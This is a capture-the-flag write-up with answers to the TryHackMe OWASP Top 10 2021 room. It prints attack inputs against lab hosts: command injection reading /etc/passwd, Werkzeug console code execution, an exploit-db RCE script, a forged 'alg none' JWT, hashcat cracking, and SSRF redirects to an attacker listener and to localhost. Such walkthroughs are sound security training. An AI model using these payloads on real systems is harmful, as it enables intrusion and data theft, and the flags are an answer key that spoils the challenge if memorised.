![OWASP Top 10 - 2021 Banner](https://tryhackme.com/img/banners/default_tryhackme.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/owasptop102021/OWASP_10_2021_Cover.png" alt="OWASP Top 10 - 2021 Logo">
</p>

# OWASP Top 10 - 2021

This guide contains the answer and steps necessary to get to them for the [OWASP Top 10 - 2021](https://tryhackme.com/room/owasptop102021) room.

## Table of contents

- [Cryptographic Failures (Challenge)](#cryptographic-failures-challenge)
- [Command Injection](#command-injection)
- [Insecure Design](#insecure-design)
- [Security Misconfiguration](#security-misconfiguration)
- [Vulnerable and Outdated Components - Lab](#vulnerable-and-outdated-components---lab)
- [Identification and Authentication Failures Practical](#identification-and-authentication-failures-practical)
- [Software Integrity Failures](#software-integrity-failures)
- [Data Integrity Failures](#data-integrity-failures)
- [Security Logging and Monitoring Failures](#security-logging-and-monitoring-failures)
- [Server-Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)

### Cryptographic Failures (Challenge)

   Have a look around the web app. The developer has left themselves a note indicating that there is sensitive data in a specific directory. 

1. What is the name of the mentioned directory?



   ><details><summary>Click for answer</summary>/assets</details>

2. Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?



   ><details><summary>Click for answer</summary>webapp.db</details>

3. Use the supporting material to access the sensitive data. What is the password hash of the admin user?



   ><details><summary>Click for answer</summary>6eea9b7ef19179a06954edd0f6c05ceb</details>

   Crack the hash.
4. What is the admin's plaintext password?

   ```cmd
   hashcat -m 0 6eea9b7ef19179a06954edd0f6c05ceb /usr/share/wordlists/rockyou.txt
   ```



   ><details><summary>Click for answer</summary>qwertyuiop</details>
   
5. Log in as the admin. What is the flag?



   ><details><summary>Click for answer</summary>THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}</details>

### Command Injection



1. What strange text file is in the website's root directory?



   ><details><summary>Click for answer</summary>drpepper.txt</details>

2. How many non-root/non-service/non-daemon users are there?

   ```cmd
   ; cat /etc/passwd
   ```

   ><details><summary>Click for answer</summary>0</details>

3. What user is this app running as?



   ><details><summary>Click for answer</summary>apache</details>

4. What is the user's shell set as?

   For this we can again look at the passwd file and look for usr entries.

   ```cmd
   ; cat /etc/passwd | grep 'usr'
   ```

   COMMAND INJECTION SHELL

   ><details><summary>Click for answer</summary>sbin/nologin</details>

6. What version of Alpine Linux is running?


   ><details><summary>Click for answer</summary>3.16.0</details>

### Insecure Design

1. What is the value of the flag in joseph's account?

   Looking at the password reset form, we see there are several security questions. The color question seems to be easily guesable, as there are 11 basic colors.

   INSECURE DESIGN COLORS

   After guessing the correct color, we get a new password for the account.

   INSECURE DESIGN PASSWORD

   Now we can log in with these credentials and see Joseph's files.

   INSECURE DESIGN FILES

   Here we will also find our flag.

   INSECURE DESIGN FLAG

   ><details><summary>Click for answer</summary>THM{Not_3ven_c4tz_c0uld_sav3_U!}</details>
   
### Security Misconfiguration

   Navigate to http://10.10.30.226:86/console to access the Werkzeug console.

   Use the Werkzeug console to run the following Python code to execute the ls -l command on the server:

   ```python
   import os; print(os.popen("ls -l").read())
   ```

1. What is the database file name (the one with the .db extension) in the current directory?

   After inputting the command in the console, we get the following list of files. One of which is our database.

   MISCONFIGURATION FILES

   ><details><summary>Click for answer</summary>todo.db</details>

3. Modify the code to read the contents of the app.py file, which contains the application's source code. What is the value of the secret_flag variable in the source code?

   To read the contents of the file `app.py`, I canged the command to:

   ```python
   import os; print(os.popen("cat app.py").read())
   ```

   MISCONFIGURATION FLAG

   ><details><summary>Click for answer</summary>THM{Just_a_tiny_misconfiguration}</details>

### Vulnerable and Outdated Components - Lab

1. What is the content of the /opt/flag.txt file?

   Looking at the site, we can see it is some sort of bookstore (CSE bookstore). 

   VULNERABLE OUTDATED PAGE

   Searching exploit-db for any exploit gives us several results, but not the one we are looking for. We need to use the correct search terms. In this case:

   ```cmd
   online book store
   ```

   This gives us the RCE exploit we are looking for.

   VULNERABLE OUTDATED EXPLOIT

   After downloading it, we can run it using pythin whilst adding the url of the site as an argument.

   ```CMD
   sudo python3 ~/Downloads/47887.py http://10.10.30.226:84
   ```
   
   This gives us remote access to the database and enables us to find the flag.

   VULNERABLE OUTDATED FLAG

   ><details><summary>Click for answer</summary>THM{But_1ts_n0t_my_f4ult!}</details>

### Identification and Authentication Failures Practical

1. What is the flag that you found in darren's account?

   We first register an account with the same name and an added whitespace in front.

   INDENTIFICATION REGISTER

   INDENTIFICATION SUCCESS

   Now we can log in with this account (remember to use the extra space) and find the flag.

   INDENTIFICATION LOGIN
   
   ><details><summary>Click for answer</summary>fe86079416a21a3c99937fea8874b667</details>

   Now try to do the same trick and see if you can log in as arthur.

3. What is the flag that you found in arthur's account?

   Again, we first register an account with the same name and an added whitespace in front.

   INDENTIFICATION REGISTER ARTHUR

   Now we can log in with this account (remember to use the extra space) and find the flag.

   INDENTIFICATION LOGIN ARTHUR

   ><details><summary>Click for answer</summary>d9ac0f7db4fda460ac3edeb75d75e16e</details>

### Software Integrity Failures

1. What is the SHA-256 hash of https://code.jquery.com/jquery-1.12.4.min.js?

   Navigating to the supplied website and inputting the source's URL gives us the hash.

   SOFTWARE INTEGRITY HASH

   ><details><summary>Click for answer</summary>sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=</details>

### Data Integrity Failures

1. Try logging into the application as guest. What is guest's account password?

   Trying to log in to the site, we get a notification with default credentials we can use.

   DATA INTEGRITY LOGIN

   ><details><summary>Click for answer</summary>guest</details>

2. What is the name of the website's cookie containing a JWT token?

   Looking at the cookies within the developer tools (F-12), we can see our JWT cookie.

   DATA INTEGRITY JWT

   ><details><summary>Click for answer</summary>jwt-session</details>

   Use the knowledge gained in this task to modify the JWT token so that the application thinks you are the user "admin".

3. What is the flag presented to the admin user?

   Now we take the first and second part of this session cookie and decode it with cyberchef from Base64. Then we change the `alg` argument to `none` and the user to `admin`.

   Then we encode both these string back to Bse64 seperately and combine them with a period between them (don't forget the trailing period).

   ```cmd
   eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjk2MjUxMjU0fQ.
   ```

   DATA INTEGRITY COOKIE

   After refreshing the page, we can see our flag.

   DATA INTEGRITY FLAG

   ><details><summary>Click for answer</summary>THM{Dont_take_cookies_from_strangers}</details>

### Security Logging and Monitoring Failures

1. What IP address is the attacker using?

   After opening and analyzing the file, we can see the attackers IP address.

   LOGGING IP

   ><details><summary>Click for answer</summary>49.99.13.16</details>

3. What kind of attack is being carried out?

   Trying various usernames and passwords is a brute force log in attack.

   ><details><summary>Click for answer</summary>Brute force</details>
   
### Server-Side Request Forgery (SSRF) 

1. Explore the website. What is the only host allowed to access the admin area?

   On the website, we can find the admin panel through the hamburger menu.

   SSRF SITE

   Here we can see that we are not allowed to access it.

   SSRF PANEL

   ><details><summary>Click for answer</summary>localhost</details>

3. Check the "Download Resume" button. Where does the server parameter point to?

   If we look at the download link, it points to an external server to get the resume.

   SSRF DOWNLOAD

   ><details><summary>Click for answer</summary>secure-file-storage.com</details>

5. Using SSRF, make the application send the request to your AttackBox instead of the secure file storage. Are there any API keys in the intercepted request?

   We must first modify the URL to redirect to our machine and specified port.

   ```cmd
   10.10.42.94:8087/download?server=10.18.78.136:1337&id=75482342
   ```

   After setting up a listener using netcat we get a connection.

   ```cmd
   nc -nlvp 1337
   ```

   SSRF REQUEST

   SSRF FLAG

   ><details><summary>Click for answer</summary>THM{Hello_Im_just_an_API_key}</details>

   Going the Extra Mile: There's a way to use SSRF to gain access to the site's admin area. Can you find it? 

   Note: You won't need this flag to progress in the room. You are expected to do some research in order to achieve your goal.

   To get access, we can try using the download redirect to redirect to itself so it thinks its coming from localhost.

   I tried multiple things.

   First, changing the server to the localhost (127.0.0.1) and added the admin url.

   ```cmd
   http://10.10.42.94:8087/download?server=secure-file-storage.com:8087&id=75482342

   http://10.10.42.94:8087/download?server=127.0.0.1:8087/admin&id=75482342
   ```

   This would still download the resume. Probably due to the id. I could not, however, remove that part, as I would get an error message saying `no file is selected`.

   Using `#` one can make the browser ignore certains strings. Url encoded this is `%23`. Adding this to the URL gives us a pdf version of the admin panel.

   ```cmd
   http://10.10.42.94:8087/download?server=127.0.0.1:8087/admin%23&id=75482342
   ```

   SSRF ADMIN FLAG
